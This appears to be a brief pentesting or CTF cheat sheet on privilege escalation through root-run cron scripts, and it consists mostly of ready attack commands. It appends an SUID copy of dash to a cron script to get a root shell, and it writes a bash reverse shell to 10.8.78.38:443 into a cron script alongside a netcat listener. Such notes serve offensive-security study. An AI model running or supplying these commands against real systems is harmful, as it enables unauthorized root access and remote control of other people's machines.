- - -
## Theory : 
A cronjob is a any task/files executables running on the particular time every minute /**hour**/**week**/**month**/**year .

## Exploiting : 

###### Be a child and do this :
If the script is running to **root** itself :

```sh
echo " cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash" >> script.sh
```

```sh
cd /var/tmp/
```

```sh
./dash -p
```

# OR

###### Check that can we write to this if not can we append to this.

```sh
ls -lsa /path/to/cron-script.sh
```

```sh
lsattr /path/to/cron-script.sh
```

If it is **writable** us :

```sh
echo 'bash -i >& /dev/tcp/10.8.78.38/443 0>&1' > /usr/local/bin/overwrite.sh
```

> [! NOTE ]   
> Try to append ( **>>** ) you code to file if direct writing not works..

check your code is placed well or not?

```sh
cat /path/to/cron-script.sh
```

On your machine : 

```sh
nc -nvlp 443
```

- - -

